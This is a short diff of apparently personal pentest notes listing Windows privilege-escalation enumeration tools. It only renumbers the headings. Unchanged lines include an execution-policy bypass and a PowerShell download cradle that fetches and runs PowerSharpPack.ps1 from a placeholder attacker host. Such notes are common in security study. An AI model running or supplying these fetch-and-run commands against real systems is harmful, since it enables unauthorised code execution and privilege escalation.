@@ -1,4 +1,4 @@
-### WinPEAS  Author:https://github.com/carlospolop/PEASS-ng/releases
+### 1: WinPEAS  Author:https://github.com/carlospolop/PEASS-ng/releases
 
 ### 2: Privesccheck (Set -ExecutionPolicy Bypass -Scope process -Force) Author: https://github.com/itm4n/PrivescCheck
 
@@ -10,6 +10,6 @@
 
 ### 4: Metasploit (multi/recon/local_exploit_suggester)
 
-### 5) PowerSharpUp 
+### 5: PowerSharpUp 
 
     iex(new-object net.webclient).downloadstring('http://ATTACK_IP:PORT/PowerSharpPack.ps1')
